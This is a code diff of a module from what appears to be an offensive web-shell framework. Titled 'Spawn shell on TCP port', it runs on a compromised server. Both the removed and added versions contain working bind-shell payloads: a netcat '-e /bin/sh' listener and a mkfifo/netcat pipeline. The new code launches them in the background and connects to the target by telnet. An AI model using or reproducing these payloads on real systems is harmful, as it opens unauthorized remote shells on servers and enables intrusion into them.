@@ -1,81 +1,46 @@
-'''
-Created on 28/ago/2011
+from core.moduleprobeall import ModuleProbeAll
+from core.moduleexception import ModuleException, ProbeSucceed, ProbeException, ExecutionException
+from core.savedargparse import SavedArgumentParser as ArgumentParser
+from urlparse import urlparse
+from socket import error
+from telnetlib import Telnet
+from time import sleep
+        
 
-@author: norby
-'''
-
-'''
-Created on 22/ago/2011
-
-@author: norby
-'''
-
-from core.module import Module, ModuleException
-from core.vector import VectorList, Vector
-from threading import Timer
-from core.parameters import ParametersList, Parameter as P
-
-classname = 'Tcp'
-
-class Tcp(Module):
-    """Spawn shell on TCP port"""
-
-    vectors = VectorList([
-            Vector('shell.sh', 'netcat-traditional', """nc -l -p %s -e /bin/sh"""),
-            Vector('shell.sh', 'netcat-bsd', """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l %s >/tmp/f""")
-
-            ])
-
-    params = ParametersList('Spawn shell on TCP port', vectors,
-            P(arg='port', help='Remote path', required=True, type=int, pos=0)
-            )
-
-    def __init__( self, modhandler , url, password):
-
-        self.last_vector = None
-        self.done = False
-
-        Module.__init__(self, modhandler, url, password)
+class Tcp(ModuleProbeAll):
+    '''Open a shell on TCP port'''
 
 
-    def run_module(self, port):
+        
+    def _set_vectors(self):
 
-        t = Timer(5.0, self.__check_module_state)
-        t.start()
-
-        vectors = self._get_default_vector2()
-        if not vectors:
-            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
-        for vector in vectors:
-
-            self.last_vector = vector.name
-            self.__execute_payload(vector, [port])
-
-        if t.isAlive():
-            t.cancel()
-
-        if not self.done:
-            self.last_vector = None
-            self.mprint("[%s] No vector works. Check port '%i' availability and privileges" % (self.name, port))
+        self.vectors.add_vector('netcat-traditional','shell.sh',  """nc -l -p $port -e $shell""")
+        self.vectors.add_vector('netcat-bsd', 'shell.sh', """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|$shell -i 2>&1|nc -l $port >/tmp/f; rm -rf /tmp/f""")
+            
 
 
-    def __execute_payload(self, vector, parameters):
+    def _set_args(self):
+        self.argparser.add_argument('port', help='Port to open', type=int)
+        self.argparser.add_argument('-shell', help='Shell', default='/bin/sh')
+        self.argparser.add_argument('-vector', choices = self.vectors.keys())
+        self.argparser.add_argument('-no-connect', help='Skip autoconnect', action='store_true')
 
-        payload = self.__prepare_payload(vector, parameters)
-        return self.modhandler.load(vector.interpreter).run({ 'cmd' : payload, 'stderr' :  'False'})
-
-
-    def __prepare_payload( self, vector, parameters):
-
-        if vector.payloads[0].count( '%s' ) == len(parameters):
-            return vector.payloads[0] % tuple(parameters)
-        else:
-            raise ModuleException(self.name,  "Error payload parameter number does not corresponds")
-
-
-    def __check_module_state(self):
-        if self.last_vector and not self.done:
-            self.params.set_and_check_parameters({'vector' : self.last_vector})
-            self.mprint('[%s] Port open. Run telnet to connect and terminate commands using semicolon' % (self.name))
-            self.done = True
-
+    def _prepare_probe(self):
+        self._result = ''
+        
+    def _execute_vector(self):
+        self.current_vector.execute_background( { 'port': self.args['port'], 'shell' : self.args['shell'] })
+        sleep(1)
+        
+    
+    def _verify_execution(self):
+        
+        if not self.args['no_connect']:
+            
+            urlparsed = urlparse(self.modhandler.url)
+            if urlparsed.hostname:
+                try:
+                    Telnet(urlparsed.hostname, self.args['port']).interact()
+                except error, e:
+                    self._result += '%s: %s\n' % (self.current_vector.name, str(e))  
+                    raise ExecutionException(self.name, str(e))
